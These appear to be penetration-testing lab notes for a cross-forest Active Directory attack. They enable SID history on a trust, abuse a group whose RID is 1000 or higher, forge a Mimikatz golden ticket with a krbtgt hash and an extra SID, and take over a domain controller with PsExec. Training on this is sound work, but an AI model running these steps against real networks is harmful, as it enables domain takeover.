#We are in corp1.com forest and want to compromise corp2.com using extra sids

#SID history was designed to address this, and we need to disable SID filtering.

#let's display the attributes of the trust object so we can see how it would change after enabling SID history:

Get-DomainTrust -Domain corp2.com

#Ex of result
SourceName      : corp1.com
TargetName      : corp2.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 4/2/2020 7:05:54 PM
WhenChanged     : 4/17/2020 9:38:08 PM

#the interesting property in this output is TrustAttributes.

#To enable SID history, we'll first log in to the domain controller of corp2.com as the Administrator user and open a command prompt.

#Next, we'll use the trust subcommand of netdom and include the source domain, the target domain and the sid history setting (/enablesidhistory) to actually enable SID history.

netdom trust corp2.com /d:corp1.com /enablesidhistory:yes

#With SID history enabled, we'll again query for the trust object and note the contents of the TrustAttributes property:

Get-DomainTrust -Domain corp2.com

#Ex of the result
SourceName      : corp2.com
TargetName      : corp1.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 4/2/2020 7:05:54 PM
WhenChanged     : 4/18/2020 2:22:10 PM

#In this output, the TREAT_AS_EXTERNAL value indicates that the forest trust is instead treated as an external trust but with the transitivity of normal forest trust.

#Microsoft dictated that any SID with a RID less than 1000 will always be filtered regardless of the SID history setting.
#However, a SID with a RID equal to or higher than 1000 is not filtered for external trust

#A non-default group will always have a RID equal to or higher than 1000. 
#If we can find a custom group whose membership will allow us to compromise a user or computer, we can use that as an entry point.

#For example, let's enumerate members of the corp2.com built-in Administrators group:

Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com

#Ex of output
GroupDomain             : corp2.com
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=corp2,DC=com
MemberDomain            : corp2.com
MemberName              : powerGroup
MemberDistinguishedName : CN=powerGroup,OU=corp2Groups,DC=corp2,DC=com
MemberObjectClass       : group
MemberSID               : S-1-5-21-4182647938-3943167060-1815963754-1106

#The powerGroup is a member of the builtin Administrators group, which means it will grant local administrator access to the 
#domain controller of corp2.com. In addition, the RID (1106) is higher than 1000.

#Let's create our golden ticket command to include the SID of powerGroup:

kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt

#With the ticket crafted and loaded into memory, we'll again attempt to gain access to dc01.corp2.com with PsExec:

c:\tools\SysinternalsSuite\PsExec.exe \\dc01.corp2.com cmd
whoami


